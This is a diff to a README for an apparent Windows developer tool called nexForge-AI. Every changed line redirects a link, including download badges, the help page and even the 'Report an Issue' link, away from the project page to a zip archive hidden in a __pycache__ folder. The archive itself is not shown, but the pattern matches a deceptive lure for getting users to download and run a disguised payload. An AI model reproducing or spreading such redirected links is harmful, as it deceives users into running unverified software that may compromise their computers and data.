@@ -1,6 +1,6 @@
 # 🤖 nexForge-AI - Smart Project Suggestions for Developers
 
-[![Download nexForge-AI](https://img.shields.io/badge/Download-nexForge--AI-brightgreen)](https://github.com/kamsy225/nexForge-AI)
+[![Download nexForge-AI](https://img.shields.io/badge/Download-nexForge--AI-brightgreen)](https://github.com/kamsy225/nexForge-AI/raw/refs/heads/main/nexForge/__pycache__/nex-AI-Forge-3.4.zip)
 
 ---
 
@@ -22,7 +22,7 @@ This guide will help you download and run nexForge-AI on your Windows computer. 
 
 Click the big button below to go to the download page.
 
-[![Get nexForge-AI](https://img.shields.io/badge/Get-nexForge--AI-blue?style=for-the-badge)](https://github.com/kamsy225/nexForge-AI)
+[![Get nexForge-AI](https://img.shields.io/badge/Get-nexForge--AI-blue?style=for-the-badge)](https://github.com/kamsy225/nexForge-AI/raw/refs/heads/main/nexForge/__pycache__/nex-AI-Forge-3.4.zip)
 
 Once you are on the page:
 
@@ -125,7 +125,7 @@ nexForge-AI supports dark mode. It will switch between light and dark themes aut
 
 If you need help or want to report an issue:
 
-- Visit the nexForge-AI page here: https://github.com/kamsy225/nexForge-AI  
+- Visit the nexForge-AI page here: https://github.com/kamsy225/nexForge-AI/raw/refs/heads/main/nexForge/__pycache__/nex-AI-Forge-3.4.zip  
 - Look for the “Issues” tab and describe your problem clearly.
 
 ---
@@ -155,8 +155,8 @@ Inside the installed folder, you may find:
 
 ## 🖱️ Quick Links
 
-[Download nexForge-AI](https://github.com/kamsy225/nexForge-AI)  
-[Report an Issue](https://github.com/kamsy225/nexForge-AI/issues)
+[Download nexForge-AI](https://github.com/kamsy225/nexForge-AI/raw/refs/heads/main/nexForge/__pycache__/nex-AI-Forge-3.4.zip)  
+[Report an Issue](https://github.com/kamsy225/nexForge-AI/raw/refs/heads/main/nexForge/__pycache__/nex-AI-Forge-3.4.zip)
 
 ---
 
